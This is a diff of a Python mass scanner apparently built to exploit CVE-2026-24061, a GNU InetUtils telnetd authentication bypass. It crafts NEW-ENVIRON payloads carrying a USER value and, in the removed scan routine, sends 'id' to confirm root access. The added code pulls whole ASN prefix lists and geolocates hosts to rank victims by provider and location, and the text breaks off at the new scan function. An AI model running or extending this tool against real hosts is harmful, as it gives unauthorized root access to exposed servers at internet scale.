@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
-# Made with ✨ Magic ©️ Nur Mukhammad Agus (https://github.com/madfxr), 2026. Free and Open Source Software (FOSS)
+# Twenty-Three Scanner - revised script
 
 import argparse
+import atexit
 import concurrent.futures
 import ipaddress
 import json
@@ -13,8 +14,12 @@ import threading
 import time
 import urllib.request
 import urllib.error
+import termios
 from dataclasses import dataclass
-from typing import List, Optional, Sequence, Set, Tuple
+from typing import List, Optional, Sequence, Set, Tuple, Dict
+
+FIXED_COL_WIDTHS = [7, 13, 31, 22, 22, 8, 14]
+BOX_WIDTH = 125
 
 IAC = 255
 DONT = 254
@@ -23,39 +28,6 @@ WONT = 252
 WILL = 251
 SB = 250
 SE = 240
-
-class LogColors:
-    RESET = '\033[0m'
-    RED = '\033[91m'
-    YELLOW = '\033[93m'
-    BLUE = '\033[94m'
-    GREEN = '\033[92m'
-
-class ColoredFormatter(logging.Formatter):
-    """Custom formatter with colored level names only."""
-
-    COLORS = {
-        'DEBUG': '\033[94m',       # Blue
-        'INFO': '\033[92m',        # Green
-        'WARNING': '\033[93m',     # Yellow
-        'ERROR': '\033[91m',       # Red
-        'CRITICAL': '\033[91m',    # Red
-    }
-
-    RESET = '\033[0m'
-
-    def format(self, record):
-        timestamp = self.formatTime(record, self.datefmt)
-
-        levelname = record.levelname
-        if levelname in self.COLORS:
-            colored_level = f"{self.COLORS[levelname]}{levelname}{self.RESET}"
-        else:
-            colored_level = levelname
-
-        message = str(record.getMessage())
-
-        return f"{timestamp} {colored_level} {self.RESET}{message}"
 
 ECHO = 1
 SUPPRESS_GO_AHEAD = 3
@@ -69,18 +41,80 @@ ENV_VALUE = 1
 ENV_ESC = 2
 ENV_USERVAR = 3
 
-ENV_OPTIONS: Set[int] = {ENVIRON, NEW_ENVIRON}
-CLIENT_WILL_OPTIONS: Set[int] = ENV_OPTIONS | {SUPPRESS_GO_AHEAD}
-SERVER_WILL_OPTIONS: Set[int] = {ECHO, SUPPRESS_GO_AHEAD}
-
 LOGIN_PROMPT_RE = re.compile(r"^(login|username|password)\s*:?\s*$", re.IGNORECASE)
 
+_ipapi_cache: Dict[str, Tuple[Optional[str], Optional[str], Optional[str]]] = {}
+
+def _set_echoctl(enable: bool) -> None:
+    try:
+        fd = sys.stdin.fileno()
+        if not sys.stdin.isatty():
+            return
+        attrs = termios.tcgetattr(fd)
+        lflag = attrs[3]
+        if hasattr(termios, "ECHOCTL"):
+            if enable:
+                lflag |= termios.ECHOCTL
+            else:
+                lflag &= ~termios.ECHOCTL
+            attrs[3] = lflag
+            termios.tcsetattr(fd, termios.TCSANOW, attrs)
+    except Exception:
+        return
+
+_set_echoctl(False)
+atexit.register(lambda: _set_echoctl(True))
+
+def split_target_tokens(value: str) -> List[str]:
+    return [token.strip() for token in value.replace(",", " ").split() if token.strip()]
+
+def parse_ports(port_value: str) -> List[int]:
+    ports: List[int] = []
+    for part in port_value.split(","):
+        part = part.strip()
+        if not part:
+            continue
+        try:
+            port = int(part)
+        except ValueError as exc:
+            raise argparse.ArgumentTypeError(f"Invalid port: {part}") from exc
+        if port < 1 or port > 65535:
+            raise argparse.ArgumentTypeError(f"Port Out of Range: {port}")
+        ports.append(port)
+    if not ports:
+        raise argparse.ArgumentTypeError("No Valid Ports Provided")
+    return ports
+
+class ColoredFormatter(logging.Formatter):
+    COLORS = {
+        'DEBUG': '\033[94m',
+        'INFO': '\033[92m',
+        'WARNING': '\033[93m',
+        'ERROR': '\033[91m',
+        'CRITICAL': '\033[91m',
+    }
+    RESET = '\033[0m'
+
+    def format(self, record):
+        timestamp = self.formatTime(record, self.datefmt)
+        levelname = record.levelname
+        colored = f"{self.COLORS.get(levelname, '')}{levelname}{self.RESET}"
+        message = str(record.getMessage())
+        return f"{timestamp} {colored} {self.RESET}{message}"
+
+def setup_logging(verbose: bool) -> logging.Logger:
+    level = logging.DEBUG if verbose else logging.INFO
+    logger = logging.getLogger("twenty_three_scanner")
+    logger.setLevel(level)
+    handler = logging.StreamHandler(sys.stderr)
+    handler.setFormatter(ColoredFormatter(fmt='%(asctime)s %(levelname)s %(message)s', datefmt='%H:%M:%S'))
+    logger.handlers = [handler]
+    return logger
+
 def normalize_text(text: str) -> str:
-    """Normalize line endings."""
     return text.replace("\r\n", "\n").replace("\r", "\n")
 
 def has_login_prompt(text: str) -> bool:
-    """Check if text contains login prompt."""
     for line in normalize_text(text).splitlines():
         stripped = line.strip()
         if not stripped:
@@ -99,12 +133,10 @@ def has_login_prompt(text: str) -> bool:
     return False
 
 def has_root_id(text: str) -> bool:
-    """Check if text contains uid=0 and gid=0."""
     lower = text.lower()
     return "uid=0" in lower and "gid=0" in lower
 
 def escape_env_data(data: bytes) -> bytes:
-    """Escape special bytes in environment data."""
     escaped = bytearray()
     for byte in data:
         if byte in (ENV_VAR, ENV_VALUE, ENV_ESC, ENV_USERVAR, IAC):
@@ -113,7 +145,6 @@ def escape_env_data(data: bytes) -> bytes:
     return bytes(escaped)
 
 def build_env_payload(option: int, name: str, value: str) -> bytes:
-    """Build NEW-ENVIRON Subnegotiation Payload."""
     name_bytes = escape_env_data(name.encode("ascii", errors="ignore"))
     value_bytes = escape_env_data(value.encode("ascii", errors="ignore"))
     payload = bytearray([IAC, SB, option, ENV_IS, ENV_VAR])
@@ -123,105 +154,7 @@ def build_env_payload(option: int, name: str, value: str) -> bytes:
     payload += bytes([IAC, SE])
     return bytes(payload)
 
-def fetch_asn_prefixes(asn: str, logger: logging.Logger) -> List[str]:
-    """Fetch IP Prefixes for a Given ASN Using Multiple Sources."""
-    asn_clean = asn.upper().replace("AS", "").strip()
-    prefixes: Set[str] = set()
-
-    try:
-        logger.info("Querying RADB for AS%s", asn_clean)
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(10)
-            s.connect(('whois.radb.net', 43))
-            s.sendall(f"-i origin AS{asn_clean}\n".encode())
-            result = ''
-            while True:
-                data = s.recv(4096).decode('utf-8', errors='ignore')
-                if not data:
-                    break
-                result += data
-
-            for line in result.split('\n'):
-                if line.startswith('route:'):
-                    prefix = line.split(':', 1)[1].strip()
-                    if prefix and '/' in prefix:
-                        try:
-                            ipaddress.ip_network(prefix)
-                            prefixes.add(prefix)
-                        except ValueError:
-                            continue
-                elif line.startswith('route6:'):
-                    prefix = line.split(':', 1)[1].strip()
-                    if prefix and '/' in prefix:
-                        try:
-                            ipaddress.ip_network(prefix)
-                            prefixes.add(prefix)
-                        except ValueError:
-                            continue
-
-        logger.info("Found %d Prefixes from RADB", len(prefixes))
-    except Exception as exc:
-        logger.warning("RADB Query Failed: %s", exc)
-
-    if not prefixes:
-        try:
-            logger.info("Querying BGPView API for AS%s", asn_clean)
-            url = f"https://api.bgpview.io/asn/{asn_clean}/prefixes"
-            req = urllib.request.Request(url)
-            req.add_header('User-Agent', 'Twenty-Three Scanner/1.0')
-
-            with urllib.request.urlopen(req, timeout=15) as response:
-                data = json.loads(response.read().decode())
-
-                if data.get('status') == 'ok':
-                    ipv4_prefixes = data.get('data', {}).get('ipv4_prefixes', [])
-                    ipv6_prefixes = data.get('data', {}).get('ipv6_prefixes', [])
-
-                    for item in ipv4_prefixes:
-                        prefix = item.get('prefix')
-                        if prefix:
-                            prefixes.add(prefix)
-
-                    for item in ipv6_prefixes:
-                        prefix = item.get('prefix')
-                        if prefix:
-                            prefixes.add(prefix)
-
-                    logger.info("Found %d Prefixes from BGPView", len(prefixes))
-        except Exception as exc:
-            logger.warning("BGPView API Query Failed: %s", exc)
-
-    if not prefixes:
-        try:
-            logger.info("Querying HackerTarget for AS%s", asn_clean)
-            url = f"https://api.hackertarget.com/aslookup/?q=AS{asn_clean}"
-            req = urllib.request.Request(url)
-            req.add_header('User-Agent', 'Twenty-Three Scanner/1.0')
-
-            with urllib.request.urlopen(req, timeout=15) as response:
-                result = response.read().decode('utf-8', errors='ignore')
-
-                for line in result.split('\n'):
-                    line = line.strip()
-                    if '/' in line:
-                        parts = line.split(',')
-                        if parts:
-                            prefix = parts[0].strip()
-                            try:
-                                ipaddress.ip_network(prefix)
-                                prefixes.add(prefix)
-                            except ValueError:
-                                continue
-
-                logger.info("Found %d Prefixes from HackerTarget", len(prefixes))
-        except Exception as exc:
-            logger.warning("HackerTarget Query Failed: %s", exc)
-
-    return sorted(list(prefixes))
-
 class TelnetNegotiator:
-    """Handle Telnet protocol negotiation."""
-
     def __init__(self, sock: socket.socket, user_value: str, logger: logging.Logger) -> None:
         self.sock = sock
         self.user_value = user_value
@@ -231,16 +164,22 @@ class TelnetNegotiator:
         self._send_requested: Set[int] = set()
 
     def send_cmd(self, cmd: int, opt: int) -> None:
-        self.sock.sendall(bytes([IAC, cmd, opt]))
-        self.logger.debug("Sent IAC %d %d", cmd, opt)
+        try:
+            self.sock.sendall(bytes([IAC, cmd, opt]))
+            self.logger.debug("Sent IAC %d %d", cmd, opt)
+        except Exception as exc:
+            self.logger.debug("send_cmd failed: %s", exc)
 
     def send_env(self, option: int) -> None:
         if option in self._env_sent:
             return
         payload = build_env_payload(option, "USER", self.user_value)
-        self.sock.sendall(payload)
-        self._env_sent.add(option)
-        self.logger.debug("Sent ENV USER=%s using option %d", self.user_value, option)
+        try:
+            self.sock.sendall(payload)
+            self._env_sent.add(option)
+            self.logger.debug("Sent ENV USER=%s using option %d", self.user_value, option)
+        except Exception as exc:
+            self.logger.debug("send_env failed: %s", exc)
 
     def env_sent(self, option: int) -> bool:
         return option in self._env_sent
@@ -353,7 +292,7 @@ class TelnetNegotiator:
         return names
 
     def _handle_subnegotiation(self, opt: int, data: bytes) -> None:
-        if opt not in ENV_OPTIONS:
+        if opt not in (ENVIRON, NEW_ENVIRON):
             self.logger.debug("Ignoring SB option %d", opt)
             return
         if not data:
@@ -383,14 +322,14 @@ class TelnetNegotiator:
 
     def _handle_command(self, cmd: int, opt: int) -> None:
         if cmd == DO:
-            if opt in CLIENT_WILL_OPTIONS:
+            if opt in (ENVIRON, NEW_ENVIRON, SUPPRESS_GO_AHEAD):
                 self.send_cmd(WILL, opt)
-                if opt in ENV_OPTIONS and opt != NEW_ENVIRON:
+                if opt in (ENVIRON, NEW_ENVIRON) and opt != NEW_ENVIRON:
                     self.send_env(opt)
             else:
                 self.send_cmd(WONT, opt)
         elif cmd == WILL:
-            if opt in SERVER_WILL_OPTIONS:
+            if opt in (ECHO, SUPPRESS_GO_AHEAD):
                 self.send_cmd(DO, opt)
             else:
                 self.send_cmd(DONT, opt)
@@ -409,195 +348,229 @@ class ScanResult:
     vulnerable: bool = False
     evidence: str = ""
     error: str = ""
+    asn: Optional[str] = None
+    provider: Optional[str] = None
+    location: Optional[str] = None
 
-def parse_ports(port_value: str) -> List[int]:
-    """Parse comma-separated port list into integers."""
-    ports: List[int] = []
-    for part in port_value.split(","):
-        part = part.strip()
-        if not part:
-            continue
-        try:
-            port = int(part)
-        except ValueError as exc:
-            raise argparse.ArgumentTypeError(f"Unauthorized Port: {part}") from exc
-        if port < 1 or port > 65535:
-            raise argparse.ArgumentTypeError(f"Port Out of Range: {port}")
-        ports.append(port)
-    if not ports:
-        raise argparse.ArgumentTypeError("No Valid Ports Provided")
-    return ports
-
-def split_target_tokens(value: str) -> List[str]:
-    return [token.strip() for token in value.replace(",", " ").split() if token.strip()]
-
-def read_targets_file(path: str) -> List[str]:
-    tokens: List[str] = []
-    with open(path, "r", encoding="utf-8") as handle:
-        for line in handle:
-            line = line.split("#", 1)[0].strip()
-            if not line:
-                continue
-            tokens.extend(split_target_tokens(line))
-    return tokens
-
-def expand_targets(
-    raw_tokens: Sequence[str],
-    logger: logging.Logger,
-    max_hosts_per_cidr: int = 1024,
-    skip_large: bool = False
-) -> List[str]:
-    targets: List[str] = []
-    seen: Set[str] = set()
-    total_skipped = 0
-    large_networks_skipped = 0
-
-    for token in raw_tokens:
-        if "/" in token:
-            try:
-                network = ipaddress.ip_network(token, strict=False)
-            except ValueError:
-                logger.warning("Skipping Invalid CIDR: %s", token)
-                continue
-
-            if skip_large and network.prefixlen < 16:
-                logger.warning("Skipping Large Network: %s", token)
-                large_networks_skipped += 1
-                continue
-
-            num_hosts = network.num_addresses
-            if network.version == 4:
-                num_hosts -= 2
-
-            if num_hosts > max_hosts_per_cidr:
-                logger.warning("CIDR %s Has %d Hosts, Limiting to %d", token, num_hosts, max_hosts_per_cidr)
-                total_skipped += (num_hosts - max_hosts_per_cidr)
-
-            count = 0
-            for ip in network.hosts():
-                if count >= max_hosts_per_cidr:
-                    break
-                ip_str = str(ip)
-                if ip_str not in seen:
-                    seen.add(ip_str)
-                    targets.append(ip_str)
-                    count += 1
-            continue
-
-        try:
-            ip = ipaddress.ip_address(token)
-        except ValueError:
-            logger.warning("Skipping Invalid Target: %s", token)
-            continue
-        ip_str = str(ip)
-        if ip_str not in seen:
-            seen.add(ip_str)
-            targets.append(ip_str)
-
-    if total_skipped > 0:
-        logger.warning("Limited %d Hosts Due to CIDR Size Limits", total_skipped)
-    if large_networks_skipped > 0:
-        logger.warning("Skipped %d Large Networks", large_networks_skipped)
-
-    return targets
-
-def scan_target(
-    host: str,
-    port: int,
-    config: ScanConfig,
-    logger: logging.Logger,
-) -> ScanResult:
-    result = ScanResult(host=host, port=port)
+def query_ipapi(ip: str, logger: logging.Logger, timeout: float = 5.0) -> Tuple[Optional[str], Optional[str], Optional[str]]:
+    global _ipapi_cache
+    if ip in _ipapi_cache:
+        return _ipapi_cache[ip]
     try:
-        with socket.create_connection((host, port), timeout=config.connect_timeout) as sock:
-            sock.settimeout(config.read_timeout)
-            negotiator = TelnetNegotiator(sock, config.user_value, logger)
+        url = f"https://ipapi.co/{ip}/json/"
+        req = urllib.request.Request(url)
+        req.add_header('User-Agent', 'Twenty-Three Scanner/1.0')
+        with urllib.request.urlopen(req, timeout=timeout) as response:
+            data = json.loads(response.read().decode())
+            asn_field = data.get('asn') or data.get('asn_org') or ""
+            asn_val = None
+            if asn_field:
+                s = str(asn_field).strip()
+                if s:
+                    asn_val = s if s.upper().startswith("AS") else f"AS{s}"
+            provider = data.get('org') or data.get('organization') or None
+            city = data.get('city', '') or ''
+            country = data.get('country_name', '') or ''
+            location = f"{city}, {country}".strip(", ") or None
+            _ipapi_cache[ip] = (asn_val, provider, location)
+            return _ipapi_cache[ip]
+    except Exception as exc:
+        logger.debug("ipapi lookup failed for %s: %s", ip, exc)
+        _ipapi_cache[ip] = (None, None, None)
+        return (None, None, None)
 
-            negotiator.send_cmd(WILL, NEW_ENVIRON)
-            negotiator.send_cmd(WILL, ENVIRON)
+def fetch_asn_prefixes(asn: str, logger: logging.Logger, raw_asn: Optional[str] = None) -> Tuple[List[str], Dict[str, int]]:
+    asn_clean = asn.upper().replace("AS", "").strip()
+    display = raw_asn if raw_asn is not None else asn_clean
+    prefixes: Set[str] = set()
+    counts = {'radb': 0, 'bgpview': 0, 'hackertarget': 0}
+    try:
+        logger.info("Querying BGPView API for ASN: %s", display)
+        url = f"https://api.bgpview.io/asn/{asn_clean}/prefixes"
+        req = urllib.request.Request(url)
+        req.add_header('User-Agent', 'Twenty-Three Scanner/1.0')
+        with urllib.request.urlopen(req, timeout=15) as response:
+            data = json.loads(response.read().decode())
+            if data.get('status') == 'ok':
+                ipv4_prefixes = data.get('data', {}).get('ipv4_prefixes', [])
+                ipv6_prefixes = data.get('data', {}).get('ipv6_prefixes', [])
+                for item in ipv4_prefixes:
+                    prefix = item.get('prefix')
+                    if prefix:
+                        prefixes.add(prefix)
+                for item in ipv6_prefixes:
+                    prefix = item.get('prefix')
+                    if prefix:
+                        prefixes.add(prefix)
+        counts['bgpview'] = len(prefixes)
+    except Exception as exc:
+        logger.debug("BGPView API Query Failed: %s", exc)
+        counts['bgpview'] = counts.get('bgpview', 0)
+    try:
+        logger.info("Querying RADB for ASN: %s", display)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(10)
+            s.connect(('whois.radb.net', 43))
+            s.sendall(f"-i origin AS{asn_clean}\n".encode())
+            result = ''
+            while True:
+                data = s.recv(4096).decode('utf-8', errors='ignore')
+                if not data:
+                    break
+                result += data
+            for line in result.splitlines():
+                line = line.strip()
+                if line.startswith('route:') or line.startswith('route6:'):
+                    prefix = line.split(':', 1)[1].strip()
+                    if prefix and '/' in prefix:
+                        try:
+                            ipaddress.ip_network(prefix)
+                            prefixes.add(prefix)
+                        except ValueError:
+                            continue
+        counts['radb'] = len(prefixes)
+    except Exception as exc:
+        logger.debug("RADB Query Failed: %s", exc)
+        counts['radb'] = counts.get('radb', 0)
+    try:
+        logger.info("Querying HackerTarget for ASN: %s", display)
+        url = f"https://api.hackertarget.com/aslookup/?q=AS{asn_clean}"
+        req = urllib.request.Request(url)
+        req.add_header('User-Agent', 'Twenty-Three Scanner/1.0')
+        with urllib.request.urlopen(req, timeout=15) as response:
+            result = response.read().decode('utf-8', errors='ignore')
+            for line in result.splitlines():
+                line = line.strip()
+                if '/' in line:
+                    parts = line.split(',')
+                    if parts:
+                        prefix = parts[0].strip()
+                        try:
+                            ipaddress.ip_network(prefix)
+                            prefixes.add(prefix)
+                        except ValueError:
+                            continue
+        counts['hackertarget'] = len(prefixes)
+    except Exception as exc:
+        logger.debug("HackerTarget Query Failed: %s", exc)
+        counts['hackertarget'] = counts.get('hackertarget', 0)
+    return sorted(list(prefixes)), counts
 
-            text = negotiator.read_text(config.read_timeout)
-            if not negotiator.send_requested(NEW_ENVIRON):
-                text += negotiator.read_text(0.3)
-            if not negotiator.env_sent(NEW_ENVIRON):
-                negotiator.send_env(NEW_ENVIRON)
+def summarize_ipapi_for_asn(raw_asn: str, logger: logging.Logger, max_prefixes: int = 8) -> List[str]:
+    if not raw_asn:
+        return []
+    logger.info("Querying ipapi for ASN: %s", raw_asn)
+    normalized = raw_asn.upper().strip()
+    asn_query = normalized[2:] if normalized.startswith("AS") else normalized
+    prefixes, counts = fetch_asn_prefixes(asn_query, logger, raw_asn)
+    if not prefixes:
+        logger.info("Found 0 Prefixes from ipapi")
+        logger.info("Found 0 Provider and Geolocation 0 from ipapi")
+        return prefixes
+    prefixes_with_ipapi = 0
+    providers: Set[str] = set()
+    locations: Set[str] = set()
+    sampled = 0
+    for prefix in prefixes:
+        if sampled >= max_prefixes:
+            break
+        try:
+            net = ipaddress.ip_network(prefix, strict=False)
+        except Exception:
+            continue
+        try:
+            sample_ip = str(next(net.hosts())) if net.version == 4 and net.num_addresses > 2 else str(net.network_address)
+        except Exception:
+            continue
+        _, prov, loc = query_ipapi(sample_ip, logger)
+        if prov:
+            prefixes_with_ipapi += 1
+            providers.add(prov)
+        if loc:
+            locations.add(loc)
+        sampled += 1
+    logger.info("Found %d Prefixes from ipapi", prefixes_with_ipapi)
+    logger.info("Found %d Prefixes from BGPView API", counts.get('bgpview', 0))
+    logger.info("Found %d Prefixes from RADB", counts.get('radb', 0))
+    logger.info("Found %d Prefixes from HackerTarget", counts.get('hackertarget', 0))
+    logger.info("Found %d Provider and Geolocation %d from ipapi", len(providers), len(locations))
+    return prefixes
 
-            text += negotiator.read_text(config.read_timeout)
-            if has_login_prompt(text):
-                result.evidence = "login prompt"
-                return result
+def summarize_targets_ipapi_from_args(args: argparse.Namespace, logger: logging.Logger, sample_limit: int = 4) -> None:
+    tokens: List[str] = []
+    if args.target:
+        for v in args.target:
+            tokens.extend(split_target_tokens(v))
+    if args.file:
+        try:
+            tokens.extend(read_targets_file(args.file))
+        except Exception:
+            pass
+    if not tokens:
+        return
+    providers: Set[str] = set()
+    locations: Set[str] = set()
+    sampled = 0
+    for tok in tokens:
+        if sampled >= sample_limit:
+            break
+        try:
+            if "/" in tok:
+                net = ipaddress.ip_network(tok, strict=False)
+                if net.version == 4 and net.num_addresses > 2:
+                    ip = str(next(net.hosts()))
+                else:
+                    ip = str(net.network_address)
+            else:
+                ip = str(ipaddress.ip_address(tok))
+        except Exception:
+            continue
+        _, prov, loc = query_ipapi(ip, logger)
+        if prov:
+            providers.add(prov)
+        if loc:
+            locations.add(loc)
+        sampled += 1
+    if providers or locations:
+        logger.info("Found %d Provider and Geolocation %d from ipapi", len(providers), len(locations))
 
-            sock.sendall(b"\r\n")
-            text += negotiator.read_text(config.read_timeout)
-            if has_login_prompt(text):
-                result.evidence = "login prompt"
-                return result
-
-            sock.sendall(b"id\r\n")
-            id_text = negotiator.read_text(config.id_timeout)
-            if has_login_prompt(text + id_text):
-                result.evidence = "login prompt"
-                return result
-
-            if has_root_id(id_text):
-                result.vulnerable = True
-                result.evidence = "uid=0/gid=0"
-            return result
-    except (socket.timeout, ConnectionRefusedError) as exc:
-        result.error = str(exc)
-        return result
-    except OSError as exc:
-        result.error = str(exc)
-        return result
-
-def setup_logging(verbose: bool) -> logging.Logger:
-    level = logging.DEBUG if verbose else logging.INFO
-
-    logging.basicConfig(
-        level=level,
-        format="%(asctime)s %(levelname)s %(message)s",
-        datefmt="%H:%M:%S",
-    )
-
-    return logging.getLogger("twenty_three_scanner")
+def center_text(text: str, width: int) -> str:
+    inner = width - 4
+    if inner <= 0:
+        return f"│ {text[:max(0, inner)]} │"
+    if len(text) > inner:
+        text = text[:inner]
+    left = (inner - len(text)) // 2
+    right = inner - len(text) - left
+    return f"│ {' ' * left}{text}{' ' * right} │"
 
 def create_compact_header(asn: str = None, targets: int = 0, ports: str = "", threads: int = 50) -> str:
-    width = 81
+    width = BOX_WIDTH
     lines = []
-
     lines.append("┌" + "─" * (width - 2) + "┐")
-
-    title = "TWENTY-THREE SCANNER v1.0"
+    title = "TWENTY-THREE SCANNER"
     padding_left = (width - 4 - len(title)) // 2
     padding_right = width - 4 - len(title) - padding_left
     lines.append("│ " + " " * padding_left + title + " " * padding_right + " │")
-
     subtitle = "CVE-2026-24061 - GNU InetUtils Telnetd Remote Authentication Bypass"
     padding_left = (width - 4 - len(subtitle)) // 2
     padding_right = width - 4 - len(subtitle) - padding_left
     lines.append("│ " + " " * padding_left + subtitle + " " * padding_right + " │")
-
     lines.append("├" + "─" * (width - 2) + "┤")
-
     if asn:
         asn_str = f"ASN: {asn}"
         padding = width - 4 - len(asn_str)
         lines.append(f"│ {asn_str}" + " " * padding + " │")
-
     targets_str = f"Targets: {targets:,} IPs"
     padding = width - 4 - len(targets_str)
     lines.append(f"│ {targets_str}" + " " * padding + " │")
-
     ports_str = f"Ports: {ports}"
     padding = width - 4 - len(ports_str)
     lines.append(f"│ {ports_str}" + " " * padding + " │")
-
     threads_str = f"Threads: {threads}"
     padding = width - 4 - len(threads_str)
     lines.append(f"│ {threads_str}" + " " * padding + " │")
-
     lines.append("└" + "─" * (width - 2) + "┘")
-
     return "\n".join(lines)
 
 def create_combined_progress_box(
@@ -610,154 +583,155 @@ def create_combined_progress_box(
     last_vulnerable_port: int = None,
     last_vulnerable_time: str = None
 ) -> str:
-    """Create combined box with scanning progress."""
-    width = 81
+    width = BOX_WIDTH
     lines = []
-
     lines.append("┌" + "─" * (width - 2) + "┐")
-
     title = "SCANNING IN PROGRESS"
     padding_left = (width - 4 - len(title)) // 2
     padding_right = width - 4 - len(title) - padding_left
     lines.append("│ " + " " * padding_left + title + " " * padding_right + " │")
-
     lines.append("├" + "─" * (width - 2) + "┤")
-
-    if last_vulnerable_time:
-        time_str = f"Timestamp:: {last_vulnerable_time}"
-    else:
-        time_str = "Timestamp:: N/A"
+    time_str = f"Timestamp:: {last_vulnerable_time}" if last_vulnerable_time else "Timestamp:: N/A"
     padding = width - 4 - len(time_str)
     lines.append(f"│ {time_str}" + " " * padding + " │")
-
-    if last_vulnerable_host:
-        ip_str = f"IP Address: {last_vulnerable_host}"
-    else:
-        ip_str = "IP Address: N/A"
+    ip_str = f"IP Address: {last_vulnerable_host}" if last_vulnerable_host else "IP Address: N/A"
     padding = width - 4 - len(ip_str)
     lines.append(f"│ {ip_str}" + " " * padding + " │")
-
-    if last_vulnerable_port:
-        port_str = f"Port: {last_vulnerable_port}"
-    else:
-        port_str = "Port: N/A"
+    port_str = f"Port: {last_vulnerable_port}" if last_vulnerable_port else "Port: N/A"
     padding = width - 4 - len(port_str)
     lines.append(f"│ {port_str}" + " " * padding + " │")
-
     endpoints_str = f"Endpoints: {completed:,}/{total:,}"
     padding = width - 4 - len(endpoints_str)
     lines.append(f"│ {endpoints_str}" + " " * padding + " │")
-
     rate_str = f"Scan Rate: {rate:.1f}/s"
     padding = width - 4 - len(rate_str)
     lines.append(f"│ {rate_str}" + " " * padding + " │")
-
-    eta_str = f"ETA: {int(eta)}s"
+    eta_str = f"ETA: {int(eta)}s" if total > 0 and rate > 0 else "ETA: N/A"
     padding = width - 4 - len(eta_str)
     lines.append(f"│ {eta_str}" + " " * padding + " │")
-
     vuln_str = f"Vulnerable Found: {vulnerable_count}"
     padding = width - 4 - len(vuln_str)
     lines.append(f"│ {vuln_str}" + " " * padding + " │")
-
-    progress_pct = (completed / total * 100) if total > 0 else 0
-
-    bar_width = 56
+    progress_pct = (completed / total * 100) if total > 0 else 0.0
+    bar_width = width - 4 - len("Progress: [] 100.0%")
+    bar_width = max(10, bar_width)
     filled = int(bar_width * completed / total) if total > 0 else 0
     filled = min(filled, bar_width)
     bar = "█" * filled + "░" * (bar_width - filled)
-
     progress_line = f"Progress: [{bar}] {progress_pct:5.1f}%"
-
     content_length = len(progress_line)
     padding = (width - 4) - content_length
     if padding < 0:
         padding = 0
-
     lines.append(f"│ {progress_line}" + " " * padding + " │")
-
     lines.append("└" + "─" * (width - 2) + "┘")
-
     return "\n".join(lines)
 
-def _center(text: str, width: int) -> str:
-    if len(text) > width:
-        text = text[:width]
-    left = (width - len(text)) // 2
-    right = width - len(text) - left
-    return (" " * left) + text + (" " * right)
-
 def create_final_compact_table(vulnerable: List[ScanResult], elapsed: float, total: int, scanned: int, interrupted: bool = False) -> str:
-    width = 81
-
-    def auto_center_title(title: str) -> str:
-        content_width = width - 4
-        padding_left = (content_width - len(title)) // 2
-        padding_right = content_width - len(title) - padding_left
-        return f"│ {' ' * padding_left}{title}{' ' * padding_right} │"
-
-    lines = []
-    lines.append("┌" + "─" * (width - 2) + "┐")
-
-    title = "SCANNING INTERRUPTED" if interrupted else "SCANNING COMPLETED"
-    lines.append(auto_center_title(title))
-    lines.append("├" + "─" * (width - 2) + "┤")
-
-    rate = scanned / elapsed if elapsed > 0 else 0
+    width = BOX_WIDTH
+    col_widths = FIXED_COL_WIDTHS
+    rate = scanned / elapsed if elapsed > 0 else 0.0
+    pct = (scanned / total * 100) if total > 0 else 0.0
     stats = [
         f"Duration: {elapsed:.1f}s",
-        f"Total Scanned: {scanned:,} Endpoints ({(scanned/total*100):.1f}%)",
+        f"Total Scanned: {scanned} Endpoints ({pct:.1f}%)",
         f"Scan Rate: {rate:.1f}/sec",
-        f"Result: {len(vulnerable)} VULNERABLE" if vulnerable else "Result: 0 NO VULNERABLE HOSTS"
+        f"Result: {len(vulnerable)} VULNERABLE"
     ]
-
+    lines = []
+    lines.append("┌" + "─" * (width - 2) + "┐")
+    lines.append(center_text("SCANNING COMPLETED" if not interrupted else "SCANNING INTERRUPTED", width))
+    lines.append("├" + "─" * (width - 2) + "┤")
     for stat in stats:
-        padding = width - 4 - len(stat)
-        lines.append(f"│ {stat}{' ' * padding} │")
-
+        lines.append(f"│ {stat:<{width-4}} │")
     if not vulnerable:
         lines.append("└" + "─" * (width - 2) + "┘")
         return "\n".join(lines)
-
     lines.append("├" + "─" * (width - 2) + "┤")
-    lines.append(auto_center_title("ALL VULNERABLE HOSTS"))
-
-    col_widths = [7, 29, 10, 30]
-
-    sep_parts = ["─" * w for w in col_widths]
-    top_sep = "├" + "┬".join(sep_parts) + "┤"
-    data_sep = "├" + "┼".join(sep_parts) + "┤"
-    bottom_sep = "└" + "┴".join(sep_parts) + "┘"
-
+    lines.append(center_text("ALL VULNERABLE HOSTS", width))
+    parts = ["─" * w for w in col_widths]
+    top_sep = "├" + "┬".join(parts) + "┤"
+    mid_sep = "├" + "┼".join(parts) + "┤"
+    bottom_sep = "└" + "┴".join(parts) + "┘"
     lines.append(top_sep)
-
-    headers = ['#', 'Host', 'Port', 'Evidence']
-    header_parts = []
-    for header, w in zip(headers, col_widths):
-        pad_left = (w - len(header)) // 2
-        pad_right = w - len(header) - pad_left
-        header_parts.append(" " * pad_left + header + " " * pad_right)
-
-    lines.append("│" + "│".join(header_parts) + "│")
-
-    lines.append(data_sep)
-
-    for i, result in enumerate(vulnerable, 1):
-        num_str = str(i)
-        host_str = result.host
-        port_str = str(result.port)
-        evidence = result.evidence or "N/A"
-
-        row_parts = []
-        for content, w in zip([num_str, host_str, port_str, evidence], col_widths):
-            pad_left = (w - len(content)) // 2
-            pad_right = w - len(content) - pad_left
-            row_parts.append(" " * pad_left + content + " " * pad_right)
-
-        lines.append("│" + "│".join(row_parts) + "│")
-
+    headers = ("#", "ASN", "Provider", "Location", "Host", "Port", "Status")
+    header_cells = [str(h).center(w) for h, w in zip(headers, col_widths)]
+    lines.append("│" + "│".join(header_cells) + "│")
+    lines.append(mid_sep)
+    for i, res in enumerate(vulnerable, 1):
+        contents = [
+            str(i),
+            str(res.asn or "N/A"),
+            str(res.provider or "N/A"),
+            str(res.location or "N/A"),
+            str(res.host or ""),
+            str(res.port),
+            "VULNERABLE"
+        ]
+        row_cells = []
+        for c, w in zip(contents, col_widths):
+            s = str(c)
+            if len(s) > w:
+                s = s[:max(0, w - 3)] + "..."
+            row_cells.append(s.center(w))
+        lines.append("│" + "│".join(row_cells) + "│")
     lines.append(bottom_sep)
     return "\n".join(lines)
+
+def scan_target(host: str, port: int, config: ScanConfig, logger: logging.Logger) -> ScanResult:
+    result = ScanResult(host=host, port=port)
+    try:
